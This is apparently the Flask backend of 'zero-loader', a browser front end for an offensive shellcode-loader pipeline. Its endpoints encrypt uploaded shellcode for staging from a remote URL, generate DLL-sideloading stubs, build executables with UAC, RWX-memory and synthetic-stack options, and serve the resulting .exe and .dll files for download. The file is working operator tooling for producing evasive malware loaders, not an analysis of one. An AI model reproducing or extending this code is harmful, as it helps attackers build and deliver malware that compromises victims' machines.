"""
zero-loader web UI backend (Flask, single-file).

Wraps Encrypt.py / SideloadGen.py / build.bat / Mutate.py so the
operator drives the whole pipeline from a browser instead of a shell.

*** LOCAL-USE ONLY ***
Binds to 127.0.0.1. Do NOT expose to a network — there is no
authentication and every endpoint triggers a subprocess with
operator-supplied file contents.
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
import sys
from pathlib import Path

from flask import Flask, Response, jsonify, request, send_file, send_from_directory


PROJECT_ROOT = Path(__file__).resolve().parent.parent
WEB_DIR      = Path(__file__).resolve().parent
STATIC_DIR   = WEB_DIR / "static"
WORKSPACE    = WEB_DIR / "workspace"

WORKSPACE.mkdir(exist_ok=True)

app = Flask(__name__, static_folder=str(STATIC_DIR), static_url_path="")


# ----- helpers ------------------------------------------------------------

SAFE_NAME_RE = re.compile(r"^[A-Za-z0-9._-]+$")


def _safe_name(name: str) -> str | None:
    """Reject anything that could traverse or inject."""
    if not name or ".." in name:
        return None
    base = os.path.basename(name)
    if not SAFE_NAME_RE.match(base):
        return None
    return base


def _run(argv: list[str], cwd: Path = PROJECT_ROOT) -> dict:
    """Run a subprocess, capture stdout+stderr, return JSON-friendly dict."""
    try:
        proc = subprocess.run(
            argv, cwd=str(cwd),
            capture_output=True, text=True, timeout=120,
        )
        return {
            "ok": proc.returncode == 0,
            "code": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
    except subprocess.TimeoutExpired as e:
        return {"ok": False, "code": -1, "stdout": e.stdout or "", "stderr": "timeout (120s)"}
    except FileNotFoundError as e:
        return {"ok": False, "code": -1, "stdout": "", "stderr": str(e)}


# ----- static -------------------------------------------------------------

@app.route("/")
def index():
    return send_from_directory(STATIC_DIR, "index.html")


# ----- encrypt ------------------------------------------------------------

@app.route("/api/encrypt", methods=["POST"])
def api_encrypt():
    if "shellcode" not in request.files:
        return jsonify({"ok": False, "stderr": "shellcode file missing"}), 400

    url = (request.form.get("url") or "").strip()
    if not url or not url.startswith(("http://", "https://")):
        return jsonify({"ok": False, "stderr": "url must start with http:// or https://"}), 400

    upload = request.files["shellcode"]
    name = _safe_name(upload.filename or "shellcode.bin") or "shellcode.bin"
    sc_path = WORKSPACE / name
    upload.save(str(sc_path))

    argv = [sys.executable, "Encrypt.py", str(sc_path), "--url", url]
    result = _run(argv)

    # The script generates Payload.h in the project root; include a preview.
    payload_path = PROJECT_ROOT / "Payload.h"
    if payload_path.is_file():
        text = payload_path.read_text(errors="replace")
        result["payload_preview"] = text[:4096]
        result["payload_bytes"] = payload_path.stat().st_size
    return jsonify(result)


# ----- sideload generator ------------------------------------------------

@app.route("/api/sideload", methods=["POST"])
def api_sideload():
    if "dll" not in request.files:
        return jsonify({"ok": False, "stderr": "dll file missing"}), 400

    upload = request.files["dll"]
    name = _safe_name(upload.filename or "target.dll") or "target.dll"
    dll_path = WORKSPACE / name
    upload.save(str(dll_path))

    rename = (request.form.get("rename") or "").strip()
    exe    = (request.form.get("exe") or "").strip()

    argv = [sys.executable, "SideloadGen.py", str(dll_path)]
    if rename:
        safe = _safe_name(rename)
        if not safe:
            return jsonify({"ok": False, "stderr": "invalid rename"}), 400
        argv += ["--rename", safe]
    if exe:
        safe = _safe_name(exe)
        if not safe:
            return jsonify({"ok": False, "stderr": "invalid exe"}), 400
        argv += ["--exe", safe]

    result = _run(argv)
    return jsonify(result)


# ----- build --------------------------------------------------------------

VALID_MODES = {"exe", "sideload"}


@app.route("/api/build", methods=["POST"])
def api_build():
    data = request.get_json(force=True, silent=True) or {}

    mode     = data.get("mode", "exe")
    uac      = bool(data.get("uac"))
    rwx      = bool(data.get("rwx"))
    debug    = bool(data.get("debug"))
    synth    = bool(data.get("synthetic"))
    output   = (data.get("output") or "").strip()
    sideload_target = (data.get("sideload_target") or "").strip()

    if mode not in VALID_MODES:
        return jsonify({"ok": False, "stderr": f"invalid mode: {mode}"}), 400

    # Call build.bat with safe positional args only.
    args = ["build.bat"]
    if mode == "sideload":
        args.append("sideload")
        if output:
            safe = _safe_name(output)
            if not safe:
                return jsonify({"ok": False, "stderr": "invalid output name"}), 400
            args.append(safe)
    if uac:
        args.append("uac")

    env = os.environ.copy()
    extras: list[str] = []
    if rwx:   extras.append("/DRWX_SHELLCODE")
    if debug: extras.append("/DDEBUG")
    if synth: extras.append("/DENABLE_SYNTHETIC_STACK")
    if extras:
        env["CFLAGS_EXTRA"] = " ".join(extras)

    def stream():
        yield f"$ {' '.join(shlex.quote(a) for a in args)}\n"
        if extras:
            yield f"CFLAGS_EXTRA={' '.join(extras)}\n"
        yield "\n"
        try:
            proc = subprocess.Popen(
                args, cwd=str(PROJECT_ROOT), env=env,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                bufsize=1, text=True,
                shell=True,  # build.bat is a .bat; needs cmd interpreter
            )
        except FileNotFoundError as e:
            yield f"[error] {e}\n"
            return

        assert proc.stdout is not None
        for line in proc.stdout:
            yield line
        proc.wait()
        yield f"\n[exit {proc.returncode}]\n"

    return Response(stream(), mimetype="text/plain; charset=utf-8")


# ----- artifacts ----------------------------------------------------------

ARTIFACT_PATTERNS = ("*.exe", "*.dll")


@app.route("/api/artifacts")
def api_artifacts():
    seen: dict[str, dict] = {}
    for pat in ARTIFACT_PATTERNS:
        for f in PROJECT_ROOT.glob(pat):
            if f.name in seen:
                continue
            seen[f.name] = {
                "name":  f.name,
                "size":  f.stat().st_size,
                "mtime": int(f.stat().st_mtime),
            }
    arts = sorted(seen.values(), key=lambda x: -x["mtime"])
    return jsonify(arts)


@app.route("/api/download/<name>")
def api_download(name):
    safe = _safe_name(name)
    if not safe:
        return "invalid", 400
    path = PROJECT_ROOT / safe
    if not path.is_file():
        return "not found", 404
    return send_file(str(path), as_attachment=True, download_name=safe)


# ----- status -------------------------------------------------------------

@app.route("/api/status")
def api_status():
    payload_h  = PROJECT_ROOT / "Payload.h"
    sideload_h = PROJECT_ROOT / "Sideload.h"
    sideload_rc = PROJECT_ROOT / "Sideload.rc"
    return jsonify({
        "payload_h":   payload_h.is_file(),
        "sideload_h":  sideload_h.is_file(),
        "sideload_rc": sideload_rc.is_file(),
    })


# ----- entrypoint ---------------------------------------------------------

if __name__ == "__main__":
    port = int(os.environ.get("ZLOADER_PORT", "7890"))
    print(f"[zero-loader web] http://127.0.0.1:{port}")
    print(f"[zero-loader web] project root: {PROJECT_ROOT}")
    print("[zero-loader web] localhost-only; DO NOT expose to a network")
    app.run(host="127.0.0.1", port=port, debug=False, threaded=True)
